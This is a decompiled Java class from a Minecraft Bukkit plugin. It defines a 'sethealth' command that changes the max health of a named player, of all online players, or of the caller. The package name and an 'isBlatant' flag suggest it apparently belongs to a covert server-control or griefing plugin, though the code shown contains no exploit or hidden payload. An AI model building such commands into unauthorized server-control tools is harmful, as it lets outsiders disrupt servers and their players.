/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class SethealthCommand
extends Command {
    private int Ma;

    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            p2.sendMessage(Settings.USAGE("sethealth (player) <health>"));
        } else if (args.length == 3) {
            try {
                this.Ma = Integer.parseInt(args[2]);
            }
            catch (NumberFormatException ex2) {
                p2.sendMessage(Settings.PREFIX("The health has to be a number"));
                return;
            }
            if (args[1].equals("*")) {
                for (Player a2 : Bukkit.getOnlinePlayers()) {
                    a2.setMaxHealth((double)this.Ma);
                }
                p2.sendMessage(Settings.PREFIX("All online players max health are now set to " + Settings.RED + this.Ma));
            } else {
                Player target = Bukkit.getServer().getPlayer(args[1]);
                if (target == null) {
                    p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + args[1] + Settings.WHITE + " is not online."));
                } else {
                    target.setMaxHealth((double)this.Ma);
                    p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + target.getName() + "'s" + Settings.WHITE + " max health is now set to " + Settings.RED + this.Ma));
                }
            }
        } else {
            try {
                this.Ma = Integer.parseInt(args[1]);
            }
            catch (NumberFormatException ex3) {
                p2.sendMessage(Settings.PREFIX("The health has to be a number"));
                return;
            }
            p2.setMaxHealth((double)this.Ma);
            p2.sendMessage(Settings.PREFIX("Your max health is now set to " + Settings.RED + this.Ma));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

